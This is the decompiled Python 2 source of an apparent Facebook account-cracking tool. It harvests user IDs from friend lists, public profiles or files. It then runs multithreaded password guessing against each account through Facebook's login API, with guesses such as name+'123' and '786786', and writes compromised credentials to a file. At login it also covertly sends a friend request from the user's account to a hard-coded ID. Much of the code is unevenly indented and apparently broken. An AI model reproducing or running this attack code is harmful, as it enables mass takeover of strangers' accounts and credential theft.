		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;92mFill in correctly"
		pilih()
			
			
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		print 42*"\033[1;97m="
		jalan('\033[1;93m[✾]\x1b[1;93m DO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;93m[✾]' )
		jalan('\033[1;92m[✾]\x1b[1;92m USE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;92m[✾]' )
		id = raw_input('\033[1;93m[!!] \x1b[0;33mID/Email \x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;92m[!!] \x1b[0;32mPassword \x1b[1;92m: \x1b[1;92m')
		print 42*"\033[1;97m="
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;92mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;92mLogin Successful...') 
				os.system('xdg-open https://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;92mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92mCHECK YOUR ACCOUNT IS CHECKPOINT")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;92mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	print 42*"="
	toket = raw_input("\033[1;91m[+]\033[1;92m Give Token\033[1;91m :\033[1;95>>\033[1;93m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;92mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;33;92m☘■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■▣■■▣▣■■▣☘"
	print "   \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;92m: "+nama+"  	   \033[1;36;40m"                               
	print "   \033[1;36;40m\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;92m"
	print "   \033[1;36;40m\033[1;34;40m[*] Subs\033[1;34;92m: "+sub+"                      \033[1;36;92m"
	print "   \033[1;33;92m☘■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■▣■■▣▣■■▣☘"
	print "\033[1;32;98m[1] \033[1;33;98m☠️ Let's start Cloning"																														
	print "\033[1;32;98m[0] \033[1;33;98m☠️ Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;33;98m✨⚝░░░░░░░░░░░░☠️☠️░░░░░░░░░░░⚝✨\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;93m[1] \033[1;33;93m👉 ☠️Attack From Friend List"
	print "\x1b[1;32;93m[2] \033[1;33;93m👉 ☠️Attack From Public ID"
	print "\x1b[1;32;93m[3] \033[1;33;93m👉 ☠️Attack From File"
	print "\x1b[1;32;33m[0] \033[1;33;93m‼️Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;92m[♥️] Getting IDs ✔️ \033[1;98m.')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;93m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;32m[🌀] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;33m[🌀] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;32m[🌀] Getting ID "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;32;92m[⚒️] Total IDs : \033[1;93m"+str(len(id))
	jalan('\033[1;33;93m[⚒️] Please Wait ▶️')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[🏵️] Cloning\033[1;92m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;93m        🔲     \x1b[1;93mYOUSUF To Stop Process Press CTRL+Z \033[1;93m    🔲"
	print "   \033[1;31;92m★══════════════════════════════════★"

	jalan('              \033[1;93mCP ACCOUNT OPEN AFTER 15 DAYS')
	print  "  \033[1;32;92m ★══════════════════════════════════★" 

       
	
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Yousuf
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + b['last_name']											
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'											
				print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']											
				print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user											
				print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
				    print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
				    print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'											
				            print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']											
				            print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user								
				            print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
				               print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
				               print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name'] + '123'											
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'								
						       print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']									
						       print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user							
						       print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
				                           print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
				                           print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = '000786'										
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'											
				                                   print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']											
				                                   print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user											
				                                   print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
				                                       print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
				                                       print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'						
						                               print '\x1b[1;97m[•⚔•] \x1b[1;97mName \x1b[1;97m    ✯ \x1b[1;97m' + b['name']							
						                               print '\x1b[1;97m[•⚔•] \x1b[1;97mID \x1b[1;97m      ✯ \x1b[1;97m' + user					
						                               print '\x1b[1;97m[•⚔•] \x1b[1;97mPassword \x1b[1;97m✯ \x1b[1;97m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ ❥ ] \x1b[1;93m[CHECKPOINT]'
				                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mName \x1b[1;93m    ✯ \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mID \x1b[1;93m      ✯ \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[•⚔•] \x1b[1;93mPassword \x1b[1;93m✯ \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               
						                                    
															
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;93m•◈•▬ ▬ ▬•◈\033[1;93mMuhammad Yousuf\033[1;93m◈•▬ ▬ ▬•◈•"
	print "  \033[1;92m«---•◈•---Developed By Muhammad Yousuf--•◈•---»" #Dev:Jam
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Mishal.py)↩\033[1;97m....'
	print"\033[1;92mTotal OK/\x1b[1;92mCP \033[1;92m: \033[1;92m"+str(len(oks))+"\033[1;92m/\033[1;93m"+str(len(cekpoint))
	print """

╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
   ╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
      ┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
      ╰╯╰━━┻━━┻━━┻━━╯╰╯
 
         Checkpoint ID Open After 14 Days
•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;92m ..Yousuf Creations.. \033[1;92m :
•\033[1;93m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91mMuhammadYousuf22"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()


# Okay Decompiling YousufDhoom/YousufDhoom.py
